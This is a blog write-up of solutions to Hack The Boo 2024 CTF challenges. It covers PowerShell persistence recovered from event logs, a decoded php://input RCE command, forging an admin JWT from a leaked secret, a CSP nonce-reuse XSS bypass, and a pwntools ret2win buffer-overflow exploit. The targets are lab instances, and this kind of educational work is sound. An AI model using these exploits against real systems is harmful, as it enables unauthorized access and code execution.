---
layout: post
title:  "Hack The Boo 2024 CTF"
date:   2024-10-26
description: 2024 edition of Hack The Boo from HTB to celebrate Cybersecurity Month and Halloween. I solved a few challenges ( ‾́ ◡ ‾́ )

tags: ctf coding forensics web pwn reversing crypto

---

## Coding

### Replacement

> A cursed spell has altered a scroll, changing key letters. Replace the haunted letter with a random one to break the curse!

![Replacement problem](/assets/img/2024-10-26-hacktheboo-ctf-2024/replacement.png)

I kind of overthinked here when I first approached the challenge.
I thought I was supposed to use `os` to leak a secret on the server.
*You're supposed to solve the programming challenge,* (☉__☉”)

```py
def solve(input_string, replace_char, replace_with_char):
    res = ""
    for c in input_string:
        if c == replace_char:
            res += replace_with_char
        else:
            res += c
    print(res)

input_string = input()
replace_char = input()
replace_with_char = input()
solve(input_string, replace_char, replace_with_char)
```

Flag: HTB{g0tTa_r3pLacE_th3_sTR1nG!!_e5247a550e68c8cb1aefddb2eb09f4bd}

### MiniMax
> In a haunted graveyard, spirits hide among the numbers. Can you identify the smallest and largest among them before they vanish?

![MiniMax](/assets/img/2024-10-26-hacktheboo-ctf-2024/minimax.png)

```python
input_stream = input()
inputs = list(map(float, input_stream.split()))
min_val = min(inputs)
max_val = max(inputs)
print(min_val)
print(max_val)
```

Flag: HTB{aLL_maX3d_0uT_c152fb39ba74c314ef3f8b641985e17c}
## Forensics

### Ghostly Persistence

> On a quiet Halloween night, when the world outside was wrapped in shadows, an intrusion alert pierced through the calm. The alert, triggered by an internal monitoring system, pinpointed unusual activity on a specific workstation. Can you illuminate the darkness and uncover what happened during this intrusion?

In this challenge, we're given Windows event logs.
I'll use `chainsaw` to search through the logs for detections.
```
% ./chainsaw_aarch64-apple-darwin hunt ../Logs/*.evtx -s sigma/ --mapping mappings/sigma-event-logs-all.yml
```

![Event ID 4104](/assets/img/2024-10-26-hacktheboo-ctf-2024/chainsaw-hunt.png)

The PS scripts with gibberish filenames stand out.

```
% ./chainsaw_aarch64-apple-darwin search -t 'Event.System.EventID: =4104' ../Logs/*.evtx --json | jq '.[]'
```

The PS scripts `wLDwomPJLN.ps1` and `3MZvgfcEiT.ps1` were downloaded to `env:TEMP` and executed.

```json
"EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "ScriptBlockText": "Get-ChildItem -Path \"$env:TEMP\" -Verbose\nGet-Process -Verbose\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-EncodedCo
mmand JHRlbXBQYXRoID0gIiRlbnY6d2luZGlyXHRlbXBcR2gwc3QudHh0IgoiSFRCe0doMHN0X0wwYzR0MTBuIiB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcFBhdGggLUVuY29kaW5nIHV0Zjg=\"\n$trigger = New-Scheduled
TaskTrigger -AtStartup\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName \"MaintenanceTask\" -Description \"\"\n",
      "ScriptBlockId": "677529ad-da67-4f73-a7b3-b3385eaed86b",
      "Path": "C:\\Users\\usr01\\AppData\\Local\\Temp\\wLDwomPJLN.ps1"
    }
```

Decoding the command in `wLDwomPJLN.ps1`, we get the first part of the flag.
```
$tempPath = "$env:windir\temp\Gh0st.txt"
"HTB{Gh0st_L0c4t10n" | Out-File -FilePath $tempPath -Encoding utf8
```

`3MZvgfcEiT.ps1` sets a registry key, and the second part of the flag is in the set value.
This decodes to `_W4s_R3v34l3d}`.
```json
"EventData": {
      "MessageNumber": 1,
      "MessageTotal": 1,
      "ScriptBlockText": "Get-PSDrive -Name C -Verbose\nGet-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\" -Verbose\n\nNew-Item -Path \"HKCU:\\Softwar
e\\cPdQnixceg\" -Force\nNew-ItemProperty -Path \"HKCU:\\Software\\cPdQnixceg\" -Name \"cPdQnixceg\" -Value \"X1c0c19SM3YzNGwzZH0=\" -PropertyType String\nGet-ScheduledTask -Verbo
se\n",
      "ScriptBlockId": "72187be7-469a-440d-ac5f-44d1f81d3de5",
      "Path": "C:\\Users\\usr01\\AppData\\Local\\Temp\\3MZvgfcEiT.ps1"
    }
```

Flag: HTB{Gh0st_L0c4t10n_W4s_R3v34l3d}


### Foggy Intrusion

> On a fog-covered Halloween night, a secure site experienced unauthorized access under the veil of darkness. With the world outside wrapped in silence, an intruder bypassed security protocols and manipulated sensitive areas, leaving behind traceable yet perplexing clues in the logs. Can you piece together the fragments of this nocturnal breach?

The given pcap file only has HTTP traffic.
Initially, the user made multiple junk requests that returned 404s.

![Status 400s](/assets/img/2024-10-26-hacktheboo-ctf-2024/http-400s.png)

I'll filter out the status 400s to find 302s that have valid responses from the server.
![Status 302s](/assets/img/2024-10-26-hacktheboo-ctf-2024/http-filter-302.png)

Following the request, we see that the user used the `php://input` filter to get RCE.
![php input filter](/assets/img/2024-10-26-hacktheboo-ctf-2024/php-input-shellcode.png)

The commands were all powershell, where the output of the executed command is first compressed before it is base64 encoded.
Therefore, to decode the responses from the server, we will have to do the reverse to get the plaintext output.

```
$ echo 'cG93ZXJzaGVsbC5leGUgLUMgIiRvdXRwdXQgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoIEM6OyAkYnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJG91dHB1dCk7ICRjb21wcmVzc2VkU3RyZWFtID0gW1N5c3RlbS5JTy5NZW1vcnlTdHJlYW1dOjpuZXcoKTsgJGNvbXByZXNzb3IgPSBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW1dOjpuZXcoJGNvbXByZXNzZWRTdHJlYW0sIFtTeXN0ZW0uSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MpOyAkY29tcHJlc3Nvci5Xcml0ZSgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpOyAkY29tcHJlc3Nvci5DbG9zZSgpOyAkY29tcHJlc3NlZEJ5dGVzID0gJGNvbXByZXNzZWRTdHJlYW0uVG9BcnJheSgpOyBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb21wcmVzc2VkQnl0ZXMpIg==' | base64 -d
powershell.exe -C "$output = Get-ChildItem -Path C:; $bytes = [Text.Encoding]::UTF8.GetBytes($output); $compressedStream = [System.IO.MemoryStream]::new(); $compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress); $compressor.Write($bytes, 0, $bytes.Length); $compressor.Close(); $compressedBytes = $compressedStream.ToArray(); [Convert]::ToBase64String($compressedBytes)"
```

I'll extract the HTTP data with `tshark` and decode the responses to discover the flag in `config.php`

```
$ tshark -r capture.pcap -Y 'tcp.stream eq 3' -T fields -e http.file_data | xxd -r -p | sed 's/^<.*>//g' > capture.response
```

```python
import base64
import zlib

with open('capture.response', 'r') as f:
    for b64_str in f:
        compressed_data = base64.b64decode(b64_str)

        decompressed_data = zlib.decompress(compressed_data, wbits=-zlib.MAX_WBITS)
        print(decompressed_data.decode('utf-8'))
```

Flag: HTB{f06_d154pp34r3d_4nd_fl46_w4s_f0und!}

## Web

### WayWitch

> Hidden in the shadows, a coven of witches communicates through arcane tokens, their messages cloaked in layers of dark enchantments. These enchanted tokens safeguard their cryptic conversations, masking sinister plots that threaten to unfold under the veil of night. However, whispers suggest that their protective spells are flawed, allowing outsiders to forge their own charms. Can you exploit the weaknesses in their mystical seals, craft a token of your own, and infiltrate their circle to thwart their nefarious plans before the next moon rises?

The page source includes the Javascript source code for generating the user's JWT.
Here, the secret key used to sign the JWT is revealed to the user, which means that we can craft our own valid JWT.

```js
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(";").shift();
}
async function generateJWT() {
    const existingToken = getCookie("session_token");
    if (existingToken) {
        console.log("Session token already exists:", existingToken);
        return;
    }
    const randomNumber = Math.floor(Math.random() * 10000);
    const guestUsername = "guest_" + randomNumber;
    const header = {
        alg: "HS256",
        typ: "JWT",
    };
    const payload = {
        username: guestUsername,
        iat: Math.floor(Date.now() / 1000),
    };
    const secretKey = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode("halloween-secret"),
        { name: "HMAC", hash: "SHA-256" },
        false,
        ["sign"],
    );
    const headerBase64 = btoa(JSON.stringify(header))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
    const payloadBase64 = btoa(JSON.stringify(payload))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
    const dataToSign = `${headerBase64}.${payloadBase64}`;
    const signatureArrayBuffer = await crypto.subtle.sign(
        { name: "HMAC" },
        secretKey,
        new TextEncoder().encode(dataToSign),
    );
    const signatureBase64 = btoa(
        String.fromCharCode.apply(
            null,
            new Uint8Array(signatureArrayBuffer),
        ),
    )
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
    const token = `${dataToSign}.${signatureBase64}`;
    document.cookie = `session_token=${token}; path=/; max-age=${60 * 60 * 24}; Secure`;
    console.log("Generated JWT Session Token:", token);
}
document
    .getElementById("submit-btn")
    .addEventListener("click", async (event) => {
        event.preventDefault();
        const name = document.getElementById("ticket-name").value;
        const description =
            document.getElementById("ticket-desc").value;
        const response = await fetch("/submit-ticket", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ name, description }),
        });
        const result = await response.json();
        document.getElementById("message-display").textContent =
            result.message
                ? result.message
                : "Ticket submitted successfully!";
    });
window.addEventListener("load", generateJWT);
```

To solve the challenge, we'll make GET request to `/tickets` with a JWT where our username is admin to get the flag.
```js
router.get("/tickets", async (req, res) => {
  const sessionToken = req.cookies.session_token;

  if (!sessionToken) {
    return res.status(401).json(response("No session token provided"));
  }

  try {
    const username = getUsernameFromToken(sessionToken);

    if (username === "admin") {
      try {
        const tickets = await db.get_tickets();
        return res.status(200).json({ tickets });
      } catch (err) {
        return res
          .status(500)
          .json(response("Error fetching tickets: " + err.message));
      }
    } else {
      return res
        .status(403)
        .json(response("Access denied. Admin privileges required."));
    }
  } catch (err) {
    return res.status(400).json(response(err.message));
  }
});
```

I'll set a breakpoint at the line right before the payload is signed, change the username to "admin" to get valid admin token.

![Breakpoint before signing payload](/assets/img/2024-10-26-hacktheboo-ctf-2024/jwt-breakpoint.png)
> To generate a new token, the existing one needs to be removed to execute `generateJWT()`.

When our breakpoint is hit, change the username in the payload to "admin".

![Change username to admin](/assets/img/2024-10-26-hacktheboo-ctf-2024/jwt-change-payload.png)

The newly generated JWT is returned in the console.

![Newly generated JWT (admin)](/assets/img/2024-10-26-hacktheboo-ctf-2024/generated-admin-token.png)

We can verify that the JWT is valid.

![Verify admin JWT](/assets/img/2024-10-26-hacktheboo-ctf-2024/verify-jwt.png)

Finally, make a request to `/tickets`.

![/tickets](/assets/img/2024-10-26-hacktheboo-ctf-2024/waywitch-flag.png)

Flag: HTB{k33p_jwt_s3cr3t_s4f3_br0_b671d6155f0ccded16feece8e666e8eb}

### Cursed Stale Policy

The challenge allows you to evaluate your own CSP policies, and has a button to trigger an XSS on the victim.
The goal here is to bypass the server's CSP policy to trigger the XSS and leak the flag.

If we look at the CSP policy, the server is using a nonce to allow JS execution.
Basically, the CSP directive will generate a nonce and this value must be used in the tag that loads a script.
If the nonce provided does not match, then JS execution is blocked.
However, for this to be safe, the nonce must be securely generated on each page load and not be guessable.

```
default-src 'self';
script-src 'self' 'nonce-04f1b2e293b28add10f481ce61af394d';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
object-src 'none';
base-uri 'none';
report-uri /csp-report
```

After making a few requests, I noticed that the nonce remained the same.
The vulnerability is here, where the application retrieves a cached CSP header from redis, therefore it can be re-used.
Since we have a known nonce, we can include the nonce in the script tag to get JS execution.

```js
export async function getCachedCSP() {
    let cachedCSP = await redis.get('cachedCSPHeader');
  
    if (cachedCSP) {
      return cachedCSP; // TOOD: Should we cache the CSP header?
    } else {
      const nonce = crypto.randomBytes(16).toString('hex');
      const cspWithNonce = `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'none'; report-uri /csp-report`;
  
      await redis.set('cachedCSPHeader', cspWithNonce);
  
      return cspWithNonce;
    }
  }
```

![Include nonce in script tag](/assets/img/2024-10-26-hacktheboo-ctf-2024/csp-nonce-bypass.png)

![Trigger XSS on victim](/assets/img/2024-10-26-hacktheboo-ctf-2024/csp-flag.png)

Flag: HTB{br0k3_th3_sp3cter's_st4l3_curs3_89a8c03c740ba094cc5effb5ff694a1f}

## Pwn

### El Mundo

```
      [Addr]       |      [Value]                                                                                                                                       
-------------------+-------------------                                                                                                                                 
                                                                                                                                                                        
0x00007ffd5f713100 | 0x0000000000000000 <- Start of buffer (You write here from right to left)                                                                          
0x00007ffd5f713108 | 0x0000000000000000                                                                                                                                 
0x00007ffd5f713110 | 0x0000000000000000                                                                                                                                 
0x00007ffd5f713118 | 0x0000000000000000                                                                                                                                 
0x00007ffd5f713120 | 0x00007feb47804644 <- Local Variables                                                                                                              
0x00007ffd5f713128 | 0x00000000deadbeef <- Local Variables (nbytes read receives)                                                                                       
0x00007ffd5f713130 | 0x00007ffd5f7131d0 <- Saved rbp                                                                                                                    
0x00007ffd5f713138 | 0x00007feb4762a1ca <- Saved return address                                                                                                         
0x00007ffd5f713140 | 0x00007feb478045c0                                                                                                                                 
0x00007ffd5f713148 | 0x00007ffd5f713258                                                                                                                                 
                                                                                                                                                                        
[*] Overflow  the buffer.                                                                                                                                               
[*] Overwrite the 'Local Variables' with junk.                                                                                                                          
[*] Overwrite the Saved RBP with junk.                                                                                                                                  
[*] Overwrite 'Return Address' with the address of 'read_flag() [0x4016b7].'                                                                                            
                                                                                                                                                                        
>
```

The challenge tells us exactly what to do.
This is a standard ret2win, we'll use the buffer overflow to overwrite the return address to `read_flag()`.

```py
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = './el_mundo' 

LOCAL = False # Change this to "True" to run it locally 

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)

# CHANGE THESE
nbytes = 56             # CHANGE THIS TO THE RIGHT AMOUNT
#read_flag_addr = 0x6969 # ADD THE CORRECT ADDRESS
read_flag_addr = 0x4016b7

# Send payload
r.sendlineafter('> ', b'A'*nbytes + p64(read_flag_addr))

# Read flag
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

Flag: HTB{z4_w4rud0o0o0o0_e03cd5fb5e2b54bc4a71d18512f40284}

### El Pipo

```
$ pwn checksec el_pipo 
[*] '/home/kali/ctf/boo-2024/el_pip/el_pipo'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

I'm not sure if this is intended, but when testing locally, the flag is returned when a logn input is suppplied.
```
$ python3 -c 'print("A"*48)' | ./el_pipo        
HTB{f4ke_fl4g_4_t35t1ng}
```

The challenge binary is running on a web server instead of listening on a `nc` connection.
`userInput` is passed to the binary here.

```html
...[SNIP]...
  <script>
    // Handle form submission asynchronously using JavaScript (AJAX)
    document.getElementById('binaryForm').addEventListener('submit', async function(event) {
      event.preventDefault(); // Prevent traditional form submission

      const input = document.getElementById('userInput').value;
      const response = await fetch('/process', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userInput: input })
      });

      const result = await response.text(); // Assuming your binary sends back plain text
      document.getElementById('result').innerText = result;
    });
  </script>

</body>
</html>
```

```
$ curl 83.136.255.36:41230/process -H 'Content-Type: application/json' -d '{"userInput":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'
HTB{3l_p1p0v3rfl0w_02e7ead43bbfa7123848c8f6d12e4e71}
```

Flag: HTB{3l_p1p0v3rfl0w_f9b76df4979bd9ad9e17dfcee1d7fa88}

## Reverse

### LinkHands

```
$ ./link
The cultists look expectantly to you - who will you link hands with? aaaaa
You fail to grasp their hands - they look at you with suspicious...
```

I read the flag from the variable in `.data`. I believe this is unintended. ¯\_(ツ)_/¯

![LinkHands 1](/assets/img/2024-10-26-hacktheboo-ctf-2024/linkhands-flag1.png)

![LinkHands 2](/assets/img/2024-10-26-hacktheboo-ctf-2024/linkhands-flag2.png)

Flag: HTB{4_br34k_1n_th3_ch41n_0e343f537ebc}

### Terrorfryer

```
$ ./fryer
Please enter your recipe for frying: foo
got:      `foo`
expected: `1_n3}f3br9Ty{_6_rHnf01fg_14rlbtB60tuarun0c_tr1y3`
This recipe isn't right :(
```

The challenge takes in an input, scrambles it, and compares it with the scrambled flag.
To get the original flag, we'll have to reverse the scrambled flag shown in `expected`.

```c
undefined8 main(void)

{
  int iVar1;
  char *pcVar2;
  long in_FS_OFFSET;
  char acStack_68 [72];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  printf("Please enter your recipe for frying: ");
  fgets(acStack_68,0x40,stdin);
  pcVar2 = strchr(acStack_68,10);
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  fryer(acStack_68);
  printf("got:      `%s`\nexpected: `%s`\n",acStack_68,desired);
  iVar1 = strcmp(desired,acStack_68);
  if (iVar1 == 0) {
    puts("Correct recipe - enjoy your meal!");
  }
  else {
    puts("This recipe isn\'t right :(");
  }
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

The scrambling function first sets the seed to 0x13377331 because `init_1` is only declared.

```c
void fryer(char *param_1)

{
  char cVar1;
  int iVar2;
  size_t sVar3;
  long lVar4;
  
  if (init_1 == 0) {
    seed_0 = 0x13377331;
    init_1 = 1;
  }
  sVar3 = strlen(param_1);
  if (1 < sVar3) {
    lVar4 = 0;
    do {
      iVar2 = rand_r(&seed_0);
      cVar1 = param_1[lVar4];
      param_1[lVar4] = param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4];
      param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4] = cVar1;
      lVar4 = lVar4 + 1;
    } while (lVar4 != sVar3 - 1);
  }
  return;
}
```

The scrambling starts from the first character in the string, and swaps the current character with the character at `iVar2 % (sVar3 - lVar4) + lVar4`.
`iVar2` is generated using `rand_r()`, and the seed is updated after each call.

```c
  sVar3 = strlen(param_1);
  if (1 < sVar3) {
    lVar4 = 0;
    do {
      iVar2 = rand_r(&seed_0);
      cVar1 = param_1[lVar4];
      param_1[lVar4] = param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4];
      param_1[(int)((ulong)(long)iVar2 % (sVar3 - lVar4)) + (int)lVar4] = cVar1;
      lVar4 = lVar4 + 1;
    } while (lVar4 != sVar3 - 1);
```

To reverse the scrambled flag, we can perform the swaps in reverse.
Since we have a known seed, we can store all the generated `rand_r` values to get the original swap indexes used.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    unsigned int seed = 0x13377331;
    int rngValues[48];
    char encrypted[] = "1_n3}f3br9Ty{_6_rHnf01fg_14rlbtB60tuarun0c_tr1y3";
    int n = strlen(encrypted);
    for (int i = 0; i < n; i++) {
        rngValues[i] = rand_r(&seed);
    }
    for (int i = n - 1; i >= 0; i--) {
        int swapIdx = ((int)(unsigned long)(long)rngValues[i] % (n - i)) + i;
        char c = encrypted[swapIdx];
        encrypted[swapIdx] = encrypted[i];
        encrypted[i] = c;
    }
    printf("%s\n", encrypted);
    return 0;
}
```

Flag: HTB{4_truly_t3rr0r_fry1ng_funct10n_9b3ab6360f11}

## Crypto

### binary basis

source.py
```py
from Crypto.Util.number import getPrime, bytes_to_long
from math import prod

FLAG = open('flag.txt', 'rb').read()

primes = [getPrime(128) for _ in range(16)]

n = prod(primes)
e = 0x10001
m = bytes_to_long(FLAG)
c = pow(m, e, n)
treat = sum([primes[i]*2**(0x1337-158*(2*i+1)) for i in range(16)])

with open('output.txt', 'w') as f:
   f.write(f'{n = }\n')
   f.write(f'{e = }\n')
   f.write(f'{c = }\n')
   f.write(f'{treat = }\n')
```

output.txt
```
n = 352189612438784047320754903106372002809877965719588610950180565262740960705788381566578345723325074804073747981488556714699194183628557150903839852453543700776971896448650422022044960974232637963499485064773137220336653165714273408753468196975611814144214482908258123395290626550717602601895666745644709508591571302894106487383195731091217527995774179358090943421864881850666765491934935419093710096767868514339375941764521600704560564724716373816013966194185050357691082654919969371044174479415710416530800029987261822155401485231590655607419352265580910531638967882492680615189164541617995862933344817766381378089
e = 65537
c = 258206881010783673911167466000280032795683256029763436680006622591510588918759130811946207631182438160709738478509009433281405324151571687747659548241818716696653056289850196958534459294164815332592660911913191207071388553888518272867349215700683577256834382234245920425864363336747159543998275474563924447347966831125304800467864963035047640304142347346869249672601692570499205877959815675295744402001770941573132409180803840430795486050521073880320327660906807950574784085077258320130967850657530500427937063971092564603795987017558962071435702640860939625245936551953348307195766440430944812377541224555649965224
treat = 33826299692206056532121791830179921422706114758529525220793629816156072250638811879097072208672826369710139141314323340868249218138311919342795011985307401396584742792889745481236951845524443087508961941376221503463082988824380033699922510231682106539670992608869544016935962884949065959780503238357140566278743227638905174072222417393094469815315554490106734525135226780778060506556705712260618278949198314874956096334168056169728142790865790971422951014918821304222834793054141263994367399532134580599152390531190762171297276760172765312401308121618180252841520149575913572694909728162718121046171285288877325684172770961191945212724710898385612559744355792868434329934323139523576332844391818557784939344717350486721127766638540535485882877859159035943771015156857329402980925114285187490669443939544936816810818576838741436984740586203271458477806641543777519866403816491051725315688742866428609979426437598677570710511190945840382014439636022928429437759136895283286032849032733562647559199731329030370747706124467405783231820767958600997324346224780651343241077542679906436580242223756092037221773830775592945310048874859407128884997997578209245473436307118716349999654085689760755615306401076081352665726896984825806048871507798497357305218710864342463697957874170367256092701115428776435510032208152373905572188998888018909750348534427300919509022067860128935908982044346555420410103019344730263483437408060519519786509311912519598116729716340850428481288557035520
```

Classic RSA challenge where the factors of `n` are known.

![Known factors](/assets/img/2024-10-26-hacktheboo-ctf-2024/known-factors-n.png)

```python
from Crypto.Util.number import inverse, long_to_bytes
from math import prod

n = 352189612438784047320754903106372002809877965719588610950180565262740960705788381566578345723325074804073747981488556714699194183628557150903839852453543700776971896448650422022044960974232637963499485064773137220336653165714273408753468196975611814144214482908258123395290626550717602601895666745644709508591571302894106487383195731091217527995774179358090943421864881850666765491934935419093710096767868514339375941764521600704560564724716373816013966194185050357691082654919969371044174479415710416530800029987261822155401485231590655607419352265580910531638967882492680615189164541617995862933344817766381378089
e = 65537
c = 258206881010783673911167466000280032795683256029763436680006622591510588918759130811946207631182438160709738478509009433281405324151571687747659548241818716696653056289850196958534459294164815332592660911913191207071388553888518272867349215700683577256834382234245920425864363336747159543998275474563924447347966831125304800467864963035047640304142347346869249672601692570499205877959815675295744402001770941573132409180803840430795486050521073880320327660906807950574784085077258320130967850657530500427937063971092564603795987017558962071435702640860939625245936551953348307195766440430944812377541224555649965224
treat = 33826299692206056532121791830179921422706114758529525220793629816156072250638811879097072208672826369710139141314323340868249218138311919342795011985307401396584742792889745481236951845524443087508961941376221503463082988824380033699922510231682106539670992608869544016935962884949065959780503238357140566278743227638905174072222417393094469815315554490106734525135226780778060506556705712260618278949198314874956096334168056169728142790865790971422951014918821304222834793054141263994367399532134580599152390531190762171297276760172765312401308121618180252841520149575913572694909728162718121046171285288877325684172770961191945212724710898385612559744355792868434329934323139523576332844391818557784939344717350486721127766638540535485882877859159035943771015156857329402980925114285187490669443939544936816810818576838741436984740586203271458477806641543777519866403816491051725315688742866428609979426437598677570710511190945840382014439636022928429437759136895283286032849032733562647559199731329030370747706124467405783231820767958600997324346224780651343241077542679906436580242223756092037221773830775592945310048874859407128884997997578209245473436307118716349999654085689760755615306401076081352665726896984825806048871507798497357305218710864342463697957874170367256092701115428776435510032208152373905572188998888018909750348534427300919509022067860128935908982044346555420410103019344730263483437408060519519786509311912519598116729716340850428481288557035520
primes = [
    177433995632585646643938770425036805593,
    201248411415496041161608451182478476651,
    211565639988646066084516543793152198691,
    219876124958933231098612850322526589449,
    231064506115305357425020635842612539447,
    234412327930918375982208973121051256703,
    237698251138254651570085824926169468373,
    257625975719126301912858129201276787967,
    271852097809552507680385772555572662251,
    275659373105708586943140025923053203649,
    287388491685355701504000759461314948007,
    299880188984019031026827249219116473077,
    301666687585301891299278182740559644813,
    307618172470874661743505812942878894883,
    324591622192086196189873735246561229599,
    328590850013220519307624591674287922827,
]

# phi(n) = (p-1)(q-1)
phi_n = prod(p - 1 for p in primes)

# d = e ^ -1 mod phi(n)  
d = inverse(e, phi_n)

# m = c ^ d mod n
m = pow(c, d, n)

flag = long_to_bytes(m)
print(flag)
```

Flag: HTB{hiding_primes_in_powers_of_two_like_an_amateur}